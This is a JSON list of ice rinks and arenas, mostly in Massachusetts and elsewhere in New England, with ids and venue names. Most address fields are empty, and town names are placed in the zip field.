[
  {
    "id": "1",
    "name": "Agganis Arena, Boston University",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "2",
    "name": "Aleixo Arena, Taunton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Taunton"
  },
  {
    "id": "3",
    "name": "Allied Veterans MDC Rink, Everett",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Everett"
  },
  {
    "id": "4",
    "name": "Amelia Park Rink, Westfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Westfield"
  },
  {
    "id": "5",
    "name": "Arlington Sports Center, Arlington",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Arlington"
  },
  {
    "id": "6",
    "name": "Armstrong Arena, Plymouth",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Plymouth"
  },
  {
    "id": "7",
    "name": "Asiaf Arena, Brockton High School",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Brockton"
  },
  {
    "id": "8",
    "name": "Babson Skating Rink, Babson College, Wellesley",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Wellesley"
  },
  {
    "id": "9",
    "name": "Belmont High School Skating Rink, Belmont",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Belmont"
  },
  {
    "id": "10",
    "name": "Biddeford Ice Rink, Biddeford, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Biddeford"
  },
  {
    "id": "11",
    "name": "Boys & Girls Club of Pittsfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pittsfield"
  },
  {
    "id": "12",
    "name": "Breakaway Ice Center, Tewksbury",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Tewksbury"
  },
  {
    "id": "13",
    "name": "Bridgewater Ice Arena, Bridgewater",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bridgewater"
  },
  {
    "id": "14",
    "name": "Bright Rink, Harvard University, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Cambridge"
  },
  {
    "id": "15",
    "name": "Buffone Arena, Worcester",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Worcester"
  },
  {
    "id": "16",
    "name": "Burbank Ice Arena, Reading",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Reading"
  },
  {
    "id": "17",
    "name": "Burlington Ice Palace, Burlington",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Burlington"
  },
  {
    "id": "18",
    "name": "Canton Metropolis Rink, Canton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Canton"
  },
  {
    "id": "19",
    "name": "CDL Arena, Raynham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Raynham"
  },
  {
    "id": "20",
    "name": "Chelmsford Forum, North Billerica",
    "address": "",
    "city": "",
    "state": "",
    "zip": "North Billerica"
  },
  {
    "id": "21",
    "name": "Coffin Sports Center, West Newton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Newton"
  },
  {
    "id": "22",
    "name": "Collins-Moylan Skating Arena, Greenfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Greenfield"
  },
  {
    "id": "23",
    "name": "Conti Forum, Boston College, Chestnut Hill",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Chestnut Hill"
  },
  {
    "id": "24",
    "name": "Cyr Arena, Springfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Springfield"
  },
  {
    "id": "25",
    "name": "Dorothy Talbot Rink, Gloucester",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Gloucester"
  },
  {
    "id": "26",
    "name": "Driscoll Arena, Fall River",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Fall River"
  },
  {
    "id": "27",
    "name": "Falmouth Ice Arena, Falmouth",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Falmouth"
  },
  {
    "id": "28",
    "name": "Coffin Sports Center, Fessenden School, West Newton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Newton"
  },
  {
    "id": "30",
    "name": "Fleet Center, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "31",
    "name": "Flynn Memorial Rink, Medford",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Medford"
  },
  {
    "id": "32",
    "name": "Foxboro Sports Center, Foxboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Foxboro"
  },
  {
    "id": "33",
    "name": "Gallo Ice Arena, Buzzards Bay",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bourne"
  },
  {
    "id": "34",
    "name": "Gore Street Rink, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Cambridge"
  },
  {
    "id": "35",
    "name": "Governors Academy Rink, Byfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Byfield"
  },
  {
    "id": "37",
    "name": "Hallenborg Memorial Pavilion, Billerica",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Billerica"
  },
  {
    "id": "38",
    "name": "Hayden Ice Facility, Lexington",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lexington"
  },
  {
    "id": "39",
    "name": "Henry Graf Skating Rink, Newburyport",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Newburyport"
  },
  {
    "id": "40",
    "name": "Hetland Memorial Arena, New Bedford",
    "address": "",
    "city": "",
    "state": "",
    "zip": "New Bedford"
  },
  {
    "id": "41",
    "name": "Hobomock Ice Arena, Pembroke",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pembroke"
  },
  {
    "id": "42",
    "name": "Holy Cross, Hart Center, Worcester",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Worcester"
  },
  {
    "id": "43",
    "name": "Horgan Skating Arena, Auburn",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Auburn"
  },
  {
    "id": "44",
    "name": "Rodman Arena, Walpole",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Walpole"
  },
  {
    "id": "45",
    "name": "Janas Memorial Rink, Lowell",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lowell"
  },
  {
    "id": "46",
    "name": "John Ryan Skating Arena, Watertown",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Watertown"
  },
  {
    "id": "47",
    "name": "Kasabuski Rink, Saugus",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Saugus"
  },
  {
    "id": "48",
    "name": "Kennedy Rink, HYCC, Hyannis",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hyannis"
  },
  {
    "id": "49",
    "name": "Larsen Arena, Winthrop",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Winthrop"
  },
  {
    "id": "50",
    "name": "LoConte Rink, Medford",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Medford"
  },
  {
    "id": "51",
    "name": "Loring Arena, Framingham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Framingham"
  },
  {
    "id": "52",
    "name": "Marthas Vineyard Arena, Oak Bluffs",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Oak Bluffs"
  },
  {
    "id": "54",
    "name": "Matthews Arena, Northeastern University, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "55",
    "name": "McVan/O'Keefe Memorial Rink, Peabody",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Peabody"
  },
  {
    "id": "56",
    "name": "Merrimack College, North Andover",
    "address": "",
    "city": "",
    "state": "",
    "zip": "North Andover"
  },
  {
    "id": "57",
    "name": "Methuen High School Rink, Methuen",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Methuen"
  },
  {
    "id": "58",
    "name": "Charles Moore Arena, Orleans",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Orleans"
  },
  {
    "id": "59",
    "name": "Adelard Arena, Mt St Charles Academy, Woonsocket, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Woonsocket"
  },
  {
    "id": "60",
    "name": "UMass Amherst, Mullins Center, Amherst",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Amherst"
  },
  {
    "id": "61",
    "name": "Nashoba Valley Olympia, Boxboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boxboro"
  },
  {
    "id": "62",
    "name": "Navin Rink, Marlboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Marlboro"
  },
  {
    "id": "63",
    "name": "New England Sports Center, Marlboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Marlboro"
  },
  {
    "id": "64",
    "name": "Flood Omni Rink, Noble & Greenough School, Dedham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Dedham"
  },
  {
    "id": "65",
    "name": "Norfolk Ice Arena, Norfolk",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Norfolk"
  },
  {
    "id": "66",
    "name": "Northstar Ice Sports, Westboro",
    "address": "",
    "city": "",
    "state": "15 Bridle Ln",
    "zip": "Westboro"
  },
  {
    "id": "67",
    "name": "O'Brien Arena, Woburn",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Woburn"
  },
  {
    "id": "68",
    "name": "O'Keefe Athletic Center, Salem State, Salem",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Salem"
  },
  {
    "id": "69",
    "name": "Olympia Center, West Springfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Springfield"
  },
  {
    "id": "70",
    "name": "Orr Rink, Amherst College, Amherst",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Amherst"
  },
  {
    "id": "71",
    "name": "Paul Cronin MDC Rink, Revere",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Revere"
  },
  {
    "id": "72",
    "name": "Pilgrim Skating Arena, Hingham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hingham"
  },
  {
    "id": "73",
    "name": "Lt. Porrazzo Memorial Rink, East Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "East Boston"
  },
  {
    "id": "74",
    "name": "Quincy Youth Arena, Quincy",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Quincy"
  },
  {
    "id": "75",
    "name": "Ristuccia Memorial Arena, Wilmington",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Wilmington"
  },
  {
    "id": "76",
    "name": "Rockland Arena, Rockland",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Rockland"
  },
  {
    "id": "77",
    "name": "Sgt. Pirelli Veterans Memorial Rink, Franklin",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Franklin"
  },
  {
    "id": "78",
    "name": "Simoni Memorial Rink, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Cambridge"
  },
  {
    "id": "79",
    "name": "Skate 3, Tyngsboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Tyngsboro"
  },
  {
    "id": "80",
    "name": "Skip Viglirolo Skating Rink, Belmont",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Belmont"
  },
  {
    "id": "81",
    "name": "Smead Arena @ Blunt Park, Springfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Springfield"
  },
  {
    "id": "82",
    "name": "Stoneham Arena, Stoneham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Stoneham"
  },
  {
    "id": "83",
    "name": "Travis Roy Rink, Tabor Academy, Marion",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Marion"
  },
  {
    "id": "85",
    "name": "The Bog, Kingston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Kingston"
  },
  {
    "id": "86",
    "name": "The Edge Sports Center, Bedford",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bedford"
  },
  {
    "id": "87",
    "name": "The Rivers School, Weston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Weston"
  },
  {
    "id": "88",
    "name": "Tony Kent Arena, South Dennis",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Dennis"
  },
  {
    "id": "89",
    "name": "Tsongas Center, Lowell",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lowell"
  },
  {
    "id": "90",
    "name": "Ulin Memorial Rink, Milton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Milton"
  },
  {
    "id": "91",
    "name": "UMass Boston Clark Center, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "92",
    "name": "USM Ice Arena,  Gorham, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Gorham"
  },
  {
    "id": "93",
    "name": "Valley Forum II, Malden",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Malden"
  },
  {
    "id": "94",
    "name": "Valley Forum, Lawrence",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lawrence"
  },
  {
    "id": "95",
    "name": "Valley Sports Arena, West Concord",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Concord"
  },
  {
    "id": "96",
    "name": "Veteran's Memorial Ice Rink, Haverhill",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Haverhill"
  },
  {
    "id": "97",
    "name": "Ed Burns Arena, Arlington",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Arlington"
  },
  {
    "id": "98",
    "name": "Veterans Memorial Rink, Somerville",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Somerville"
  },
  {
    "id": "99",
    "name": "Veterans Memorial Rink, Waltham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Waltham"
  },
  {
    "id": "100",
    "name": "Veterans Skating Arena, Gardner",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Gardner"
  },
  {
    "id": "102",
    "name": "Walter Brown Arena, Boston University, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "103",
    "name": "Waterville Valley Ice Arena, Waterville, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Waterville"
  },
  {
    "id": "104",
    "name": "West Suburban Arena, Natick",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Natick"
  },
  {
    "id": "105",
    "name": "William Connery MDC Rink, Lynn",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lynn"
  },
  {
    "id": "106",
    "name": "Lossone Rink, Williston Academy, Easthampton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Easthampton"
  },
  {
    "id": "107",
    "name": "Winchendon School Ice Arena, Winchendon",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Wichendon"
  },
  {
    "id": "108",
    "name": "Worcester Ice Center, Worcester",
    "address": "",
    "city": "",
    "state": "104 Harding St.",
    "zip": "Worcester"
  },
  {
    "id": "109",
    "name": "Zapustas Arena, Randolph",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Randolph"
  },
  {
    "id": "110",
    "name": "Iorio Arena, Cushing Academy, Ashburnham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Ashburnham"
  },
  {
    "id": "113",
    "name": "Fitzpatrick Skating Arena, Holyoke",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Holyoke"
  },
  {
    "id": "114",
    "name": "Gardner Rink, St. Mark's School, Southboro",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Southboro"
  },
  {
    "id": "115",
    "name": "Groton School Rink, Groton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Groton"
  },
  {
    "id": "116",
    "name": "MassMutual Center, Springfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Springfield"
  },
  {
    "id": "124",
    "name": "Wallace Civic Center, Gaetz Arena, Fitchburg",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Fitchburg"
  },
  {
    "id": "126",
    "name": "Bajko Memorial Rink, Hyde Park",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hyde Park"
  },
  {
    "id": "127",
    "name": "Dexter School Thorndike Rink, Brookline",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Brookline"
  },
  {
    "id": "128",
    "name": "Jim Roche Community Ice Arena, West Roxbury",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West  Roxbury"
  },
  {
    "id": "129",
    "name": "Murphy Memorial Rink, South Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Boston"
  },
  {
    "id": "130",
    "name": "Harrison Rink, Phillips Andover Academy, Andover",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Andover"
  },
  {
    "id": "131",
    "name": "Johnson Rink, Pingree School, South Hamilton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Hamilton"
  },
  {
    "id": "132",
    "name": "Shea Memorial Rink, Quincy",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Quincy"
  },
  {
    "id": "133",
    "name": "St Sebastians Lane Rink, Needham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Needham"
  },
  {
    "id": "134",
    "name": "Thorndike Rink, Brookline",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Brookline"
  },
  {
    "id": "136",
    "name": "Emmons-Horrigan-O'Neil Rink, Charlestown",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Charlestown"
  },
  {
    "id": "137",
    "name": "Gutterson Field House, UVM, South Burlington, VT.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Burlington"
  },
  {
    "id": "138",
    "name": "Thayer Arena, Warwick, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Warwick"
  },
  {
    "id": "139",
    "name": "Bradford R. Boss Arena, URI, Kingston, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Kingston"
  },
  {
    "id": "140",
    "name": "Dennis M Lynch Arena, Pawtucket, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pawtucket"
  },
  {
    "id": "142",
    "name": "Vietnam Veterans Memorial Rink, North Adams",
    "address": "",
    "city": "",
    "state": "",
    "zip": "North Adams"
  },
  {
    "id": "143",
    "name": "Berkshire School, Stewart Athletic Center, Sheffield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Sheffield"
  },
  {
    "id": "144",
    "name": "Williams College, Lansing Chapman Rink, Williamstown",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Williamstown"
  },
  {
    "id": "145",
    "name": "Trinity College Koeppel Sports Center, Hartford, CT.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hartford"
  },
  {
    "id": "146",
    "name": "Christopher Nugent Bovers Community Rink, Nantucket",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Nantucket"
  },
  {
    "id": "148",
    "name": "Portland Ice Arena, Portland, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Portland"
  },
  {
    "id": "149",
    "name": "Travis Roy Ice Arena, Yarmouth, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "North Yarmouth"
  },
  {
    "id": "150",
    "name": "Douglas Everett Arena, Concord, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Concord"
  },
  {
    "id": "151",
    "name": "Loomis Chaffee Ice Rink, Windsor, Ct.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Windsor"
  },
  {
    "id": "152",
    "name": "Conway Arena, Nashua, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Nashua"
  },
  {
    "id": "153",
    "name": "The Rinks at Exeter, Exeter, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Exeter"
  },
  {
    "id": "154",
    "name": "Cairns Arena, South Burlington, Vt.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Burlington"
  },
  {
    "id": "155",
    "name": "Avon School Rink, Avon, Ct.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Avon"
  },
  {
    "id": "156",
    "name": "Wonderland of Ice, Bridgeport, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bridgeport"
  },
  {
    "id": "157",
    "name": "Roberts Ice Rink, Milton Academy, Milton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Milton"
  },
  {
    "id": "159",
    "name": "International Skating Center, Simsbury, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Simsbury"
  },
  {
    "id": "160",
    "name": "Deerfield Academy Rink, Deerfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Deerfield"
  },
  {
    "id": "161",
    "name": "Grant Hockey Rink,  Lawrence Academy, Groton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Groton"
  },
  {
    "id": "162",
    "name": "Daly Memorial Rink, Brighton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Newton"
  },
  {
    "id": "163",
    "name": "Connell Memorial Rink, Weymouth",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Weymouth"
  },
  {
    "id": "164",
    "name": "Valley Forum, Haverhill",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Haverhill"
  },
  {
    "id": "166",
    "name": "Location TBA",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "167",
    "name": "TD Garden, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "168",
    "name": "DCU Center, Worcester",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Worcester"
  },
  {
    "id": "169",
    "name": "The Spurrier-Snyder Rink, Wesleyan University, Middletown, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Middletown"
  },
  {
    "id": "170",
    "name": "JFK Coliseum, Manchester, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Manchester"
  },
  {
    "id": "171",
    "name": "Bridgton Ice Arena, North Bridgton, ME.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "North Bridgton"
  },
  {
    "id": "172",
    "name": "Buckingham, Brown & Nichols, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Cambridge"
  },
  {
    "id": "173",
    "name": "Smithfield Municipal Rink, Smithfield, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Smithfield"
  },
  {
    "id": "174",
    "name": "South Windsor Arena, South Windsor, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "South Windsor"
  },
  {
    "id": "177",
    "name": "Boch Ice Center, Dedham",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Dedham"
  },
  {
    "id": "179",
    "name": "Dover Arena, Dover, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Dover"
  },
  {
    "id": "180",
    "name": "Schneider Arena, Providence College, Providence, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Providence"
  },
  {
    "id": "181",
    "name": "Nantucket Ice Skating Rink, Nantucket",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Nantucket"
  },
  {
    "id": "182",
    "name": "William Chase Arena, Natick",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Natick"
  },
  {
    "id": "183",
    "name": "Travis Roy Rink, Tabor Academy, Marion",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Marion"
  },
  {
    "id": "184",
    "name": "Ice Center Rink, Salem NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Salem"
  },
  {
    "id": "185",
    "name": "MHG Ice Centre, Saco, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Saco"
  },
  {
    "id": "186",
    "name": "Whiston Bragdon Arena, Governor's Academy, Byfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Byfield"
  },
  {
    "id": "187",
    "name": "Northfield Mount Herman Rink, Mount Hermon",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Mount Hermon"
  },
  {
    "id": "188",
    "name": "Ice Den Arena, Hooksett, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "189",
    "name": "James W. Campion, III Rink, Hanover, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "190",
    "name": "Collins-Perley Sports Complex, St. Albans, VT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "St. Albans"
  },
  {
    "id": "191",
    "name": "Frozen Fenway, Fenway Park, Boston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Boston"
  },
  {
    "id": "192",
    "name": "Lou Astorino Ice Arena, Hamden, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hamden"
  },
  {
    "id": "193",
    "name": "Conti Forum, Boston College, Chestnut Hill",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Chestnut Hill"
  },
  {
    "id": "195",
    "name": "Pratt Memorial Rink, Middlesex School, Concord",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "196",
    "name": "Enfield Twin Rinks, Enfield, CT.",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Enfield, CT"
  },
  {
    "id": "197",
    "name": "Salem ICenter, Salem, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "198",
    "name": "Brooks School Rink, North Andover",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "199",
    "name": "Nelson Withington Rink, Brattleboro, VT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "200",
    "name": "Lou Astorino Ice Rink, Hamden, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "201",
    "name": "Johnson Athletic Ctr., MIT, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "202",
    "name": "Ice Huts Rink, Dracut",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "203",
    "name": "Levy Rink, Harrisville, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "204",
    "name": "The Spurrier-Snyder Rink, Wesleyan University, Middletown, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "205",
    "name": "Cranston Bubble Rink, Cranston, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "206",
    "name": "Sullivan Arena, St. Anslem College, Goffstown, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "207",
    "name": "Veterans Memorial Rink,  West Hartford, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "208",
    "name": "Grant Rink, Lawrence Academy, Groton",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "209",
    "name": "Noble & Greenough School, Dedham",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "210",
    "name": "John S. Haldane Memorial Arena, Pulaski, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "211",
    "name": "Veterans Memorial Rink, Cranston, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "212",
    "name": "Rhode Island Sports Center,  North Smithfield, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "214",
    "name": "Canton Sportsplex, Canton",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "215",
    "name": "Conway Arena, Nashua, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "216",
    "name": "Larz Anderson Rink, Brookline",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "217",
    "name": "The AmeriHealth Pavilion at Prudential Center, Newark, NJ",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "218",
    "name": "Olympic Arena, Lake Placid, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "219",
    "name": "Newington Arena, Hartford, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "220",
    "name": "Terry Conners Rink, Stamford, CT.",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "221",
    "name": "The Darien Ice Rink, Darien, CT.",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "223",
    "name": "MacDowell Ice Arena, Rivers School, Weston",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "224",
    "name": "Haldane Memorial Building Arena, Pulaski, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "225",
    "name": "McCollum Arena, Northfield Mt Hermon School, Northfield",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "226",
    "name": "Cyclones Arena, Hudson, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "227",
    "name": "Whitestown Ice Arena, Whitesboro, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Whitesboro, NY"
  },
  {
    "id": "228",
    "name": "John S. Haldane Memorial Arena",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pulaski, NY"
  },
  {
    "id": "230",
    "name": "UNH Whittemore Center Arena, Durham, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Durham"
  },
  {
    "id": "231",
    "name": "Simsbury Farms Rink, West Simsbury, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Simsbury"
  },
  {
    "id": "232",
    "name": "Meehan Rink, Brown University, Providence, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Providence"
  },
  {
    "id": "233",
    "name": "Raynham Ice Plex, Raynham",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "235",
    "name": "Blackstone Valley Ice Arena, Hopedale",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hopedale"
  },
  {
    "id": "236",
    "name": "MacDowell Ice Arena, Rivers School, Weston",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Weston"
  },
  {
    "id": "237",
    "name": "Hockeytown USA, Saugus",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Saugus"
  },
  {
    "id": "238",
    "name": "Nichols Athletic Center, BB&N School, Cambridge",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Cambridge"
  },
  {
    "id": "239",
    "name": "The Hotchkiss School Rink, Lakeville, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
